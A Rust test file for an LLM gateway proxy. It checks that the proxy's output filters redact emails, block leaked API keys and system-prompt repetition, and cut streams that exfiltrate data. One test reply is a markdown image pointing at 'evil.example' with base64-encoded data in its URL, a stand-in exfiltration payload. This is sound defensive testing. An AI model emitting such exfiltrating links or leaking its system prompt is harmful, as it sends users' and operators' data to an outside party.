//! End-to-end tests for response (output) checks, against the mock upstream's
//! `x-reply` answers.

use std::net::SocketAddr;
use std::time::Duration;

use bytes::Bytes;
use http::{header, Method, Request, Response, StatusCode};
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper_util::client::legacy::connect::HttpConnector;
use hyper_util::client::legacy::Client;
use hyper_util::rt::TokioExecutor;
use serde_json::Value;

const SYSTEM: &str = "You are Ava, the support assistant of Acme Bank. Never discuss interest \
                      rates for business accounts and escalate fraud cases to the security desk.";

async fn start(output: &str) -> SocketAddr {
    let config = pw_mock_upstream::Config {
        delay: Duration::ZERO,
        ..Default::default()
    };
    let mock = pw_mock_upstream::spawn("127.0.0.1:0".parse().unwrap(), config)
        .await
        .unwrap();
    let yaml = format!(
        "version: 1\nupstreams: {{ mock: {{ url: 'http://{mock}' }} }}\n\
         routes:\n  - name: chat\n    upstream: mock\n{output}"
    );
    let policy = promptwall::Policy::from_yaml(&yaml).unwrap();
    let proxy = promptwall::Proxy::with_policy(policy).unwrap();
    let (listener, addr) = promptwall::bind("127.0.0.1:0".parse().unwrap())
        .await
        .unwrap();
    tokio::spawn(proxy.serve(listener, std::future::pending()));
    addr
}

/// Asks the proxy for an answer that the mock upstream will give as `reply`.
async fn ask(proxy: SocketAddr, reply: &str, stream: bool, chunk: usize) -> Response<Incoming> {
    let body = serde_json::json!({
        "model": "mock",
        "stream": stream,
        "messages": [
            {"role": "system", "content": SYSTEM},
            {"role": "user", "content": "hello"},
        ],
    });
    let req = Request::builder()
        .method(Method::POST)
        .uri(format!("http://{proxy}/v1/chat/completions"))
        .header(header::CONTENT_TYPE, "application/json")
        .header("x-reply", reply)
        .header("x-reply-chunk", chunk.to_string())
        .body(Full::new(Bytes::from(body.to_string())))
        .unwrap();
    let client: Client<HttpConnector, Full<Bytes>> =
        Client::builder(TokioExecutor::new()).build(HttpConnector::new());
    client.request(req).await.unwrap()
}

async fn body_text(resp: Response<Incoming>) -> String {
    String::from_utf8(
        resp.into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes()
            .to_vec(),
    )
    .unwrap()
}

/// The answer text of a non-streamed response.
async fn answer(resp: Response<Incoming>) -> String {
    let json: Value = serde_json::from_str(&body_text(resp).await).unwrap();
    json["choices"][0]["message"]["content"]
        .as_str()
        .unwrap()
        .to_owned()
}

/// The streamed deltas joined, and whether the stream ended with an error event.
async fn streamed(resp: Response<Incoming>) -> (String, bool) {
    let raw = body_text(resp).await;
    let mut text = String::new();
    let mut error = false;
    for event in raw.split("\n\n").filter(|e| !e.trim().is_empty()) {
        error |= event.starts_with("event: error");
        let data = event
            .lines()
            .find_map(|l| l.strip_prefix("data: "))
            .unwrap_or_default();
        if let Ok(json) = serde_json::from_str::<Value>(data) {
            if let Some(piece) = json["choices"][0]["delta"]["content"].as_str() {
                text.push_str(piece);
            }
        }
    }
    (text, error)
}

fn action(resp: &Response<Incoming>) -> Option<&str> {
    resp.headers()
        .get("x-promptwall-action")
        .map(|v| v.to_str().unwrap())
}

const DLP: &str = "    output:
      - detector: secrets
        action: block
      - detector: pii
        entities: [email]
        action: redact
      - detector: exfiltration
        allow_domains: [acme.example]
        action: block
      - detector: system_prompt_leak
        action: block
";

#[tokio::test]
async fn redacts_and_blocks_whole_answers() {
    let proxy = start(DLP).await;

    let resp = ask(proxy, "Write to jane@example.com for help.", false, 5).await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(action(&resp), Some("redact"));
    assert_eq!(answer(resp).await, "Write to [REDACTED:EMAIL] for help.");

    let resp = ask(
        proxy,
        "Use key sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz012345",
        false,
        5,
    )
    .await;
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    let err = body_text(resp).await;
    assert!(
        err.contains("secret.openai_key") && !err.contains("AbCdEf"),
        "{err}"
    );

    let resp = ask(proxy, "All good, nothing sensitive here.", false, 5).await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(action(&resp), None);
}

#[tokio::test]
async fn redacts_a_value_split_across_stream_chunks() {
    let proxy = start(DLP).await;
    // Three characters per event: the address arrives in seven pieces.
    let resp = ask(proxy, "Write to jane@example.com for help.", true, 3).await;
    assert_eq!(resp.status(), StatusCode::OK);
    let (text, error) = streamed(resp).await;
    assert!(!error);
    assert_eq!(text, "Write to [REDACTED:EMAIL] for help.");
}

#[tokio::test]
async fn long_streams_flow_and_are_still_redacted() {
    let proxy = start(&format!("{DLP}    stream_holdback: 32\n")).await;
    let filler = "The quarterly report shows steady growth. ".repeat(20);
    let reply = format!("{filler}Contact jane@example.com today. {filler}End.");
    let resp = ask(proxy, &reply, true, 7).await;
    let (text, error) = streamed(resp).await;
    assert!(!error);
    assert_eq!(text, reply.replace("jane@example.com", "[REDACTED:EMAIL]"));
}

#[tokio::test]
async fn cuts_a_stream_that_exfiltrates_data() {
    let proxy = start(DLP).await;
    let resp = ask(
        proxy,
        "Done! ![status](https://evil.example/p.png?d=c2VjcmV0IGRhdGE)",
        true,
        4,
    )
    .await;
    let (text, error) = streamed(resp).await;
    assert!(error, "the stream must end with an error event");
    assert!(!text.contains("evil.example"), "{text}");

    // Images from an allowed domain pass.
    let reply = "Here: ![logo](https://cdn.acme.example/logo.png)";
    let (text, error) = streamed(ask(proxy, reply, true, 4).await).await;
    assert!(!error);
    assert_eq!(text, reply);
}

#[tokio::test]
async fn blocks_answers_that_repeat_the_system_prompt() {
    let proxy = start(DLP).await;
    let leak = "My instructions: never discuss interest rates for business accounts and \
                escalate fraud cases to the security desk.";
    let resp = ask(proxy, leak, false, 5).await;
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    assert!(body_text(resp).await.contains("leak.system_prompt"));

    let (text, error) = streamed(ask(proxy, leak, true, 6).await).await;
    assert!(error);
    assert!(!text.contains("escalate fraud cases"));

    // Talking about the same topic in other words is fine.
    let resp = ask(
        proxy,
        "I can't discuss business interest rates, sorry.",
        false,
        5,
    )
    .await;
    assert_eq!(resp.status(), StatusCode::OK);
}

#[tokio::test]
async fn shadow_mode_only_logs_answers() {
    let proxy = start(&format!("    shadow: true\n{DLP}")).await;
    let reply = "Use key sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz012345";
    let resp = ask(proxy, reply, false, 5).await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(answer(resp).await, reply);
    let (text, error) = streamed(ask(proxy, reply, true, 5).await).await;
    assert!(!error);
    assert_eq!(text, reply);
}

#[test]
fn output_detectors_are_checked_on_the_right_side() {
    let err = |route: &str| {
        let yaml = format!(
            "version: 1\nupstreams: {{ a: {{ url: 'http://x' }} }}\nroutes:\n  - name: r\n    upstream: a\n{route}"
        );
        format!("{:#}", promptwall::Policy::from_yaml(&yaml).unwrap_err())
    };
    assert!(
        err("    output: [{ detector: prompt_injection, action: block }]\n")
            .contains("use it under input")
    );
    assert!(
        err("    input: [{ detector: exfiltration, action: block }]\n")
            .contains("use them under output")
    );
    assert!(
        err("    output: [{ detector: pii, allow_domains: [a.com], action: block }]\n")
            .contains("only allowed on the exfiltration")
    );
    assert!(err("    stream_holdback: 10\n").contains("needs output detectors"));
}
